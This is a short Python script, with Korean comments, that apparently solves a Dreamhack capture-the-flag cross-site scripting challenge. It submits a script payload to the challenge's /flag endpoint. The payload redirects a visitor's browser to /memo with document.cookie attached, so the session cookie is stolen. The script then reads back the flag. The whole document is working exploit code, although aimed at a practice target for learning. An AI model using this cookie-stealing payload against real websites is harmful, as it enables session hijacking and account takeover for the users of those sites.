import re
from requests import request as req

# 쿠키의 값을 읽어와 /memo에 요청하는 스크립트
script = "<script>location.href =`/memo?memo=${document.cookie || 'NONE'}`</script>"

# /flag 요청
res_flag = req(
    method="POST",
    url="http://host8.dreamhack.games:11466/flag",
    data={"param": script},
)

if not res_flag.status_code == 200:
    raise Exception("ERROR")

# /memo 확인
res_memo = req(
    method="GET",
    url="http://host8.dreamhack.games:11466/memo",
)

# flag 필터링
match = re.search("DH{.*}", res_memo.text)

print(match.group() if match else "NO FLAG")
